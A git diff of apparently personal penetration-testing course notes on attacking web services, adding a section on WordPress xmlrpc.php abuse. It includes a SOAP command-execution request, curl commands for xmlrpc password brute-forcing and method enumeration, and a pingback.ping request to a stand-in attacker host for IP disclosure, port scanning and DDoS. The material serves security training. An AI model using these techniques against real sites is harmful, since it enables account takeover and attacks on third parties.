@@ -399,8 +399,6 @@ while True:
     print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
 ```
 
-
-
 ## Command Injection 
 
 command injections against web services would allow system command execution directly on the back-end server   
@@ -450,4 +448,52 @@ this means that we could use this to instead call our request to something like:
 `http://<target>:3003/ping-server.php/system/ls`
 
 ![](Images/Pasted%20image%2020240307152039.png)
+
+## Attacking WordPress 'xmlrpc.php'
+
+`xmlrpc.php` being enabled on a wordpress instance is not a vulnerability, but depending on the methods allowed it can give some enumeration and exploitation activities 
+
+if we are assessing the security of `http://blog.inlanefreight.com` and through enumeration found the `admin` username and that `xmlrpc.php` is enabled   
+
+we can then mount a password brute-force attack through `xmlrpc.php`: 
+
+```shell
+curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+```
+
+we knew that we could call this with `system.listMethods` and by going through the wordpress source code https://codex.wordpress.org/XML-RPC/system.listMethods and by interacting with the `xmlrpc.php`: 
+
+```shell
+curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+```
+
+![](Images/Pasted%20image%2020240307163034.png)
+
+in the above list we can find `pingback.ping` which allows for XML-RPC pingbacks which is a comment that's created when you link to another blog post as long as the other blog is set to accept pingbacks 
+
+if pingbacks are available the can facilitate: 
+- ip disclosure - can call pingback.ping on a wordpress instance behind cloudfare to identify its public IP. The pingback will point to an attacker-controlled host like a VPS that will be accessible by a wordpress instance 
+- cross-site port attack (XSPA) - can call pingback.ping against itself on different ports 
+- DDoS - can call pingback.back on numerous wordpress instances against a single target 
+
+as soon as the below request is sent, the attacker controlled host will receive a request (pingback) originating from the target site and exposing its public IP address: 
+
+```http
+--> POST /xmlrpc.php HTTP/1.1 
+Host: blog.inlanefreight.com 
+Connection: keep-alive 
+Content-Length: 293
+
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+<param>
+<value><string>http://attacker-controlled-host.com/</string></value>
+</param>
+<param>
+<value><string>https://blog.inlanefreight.com/2015/10/what-is-cybersecurity/</string></value>
+</param>
+</params>
+</methodCall>
+```
 
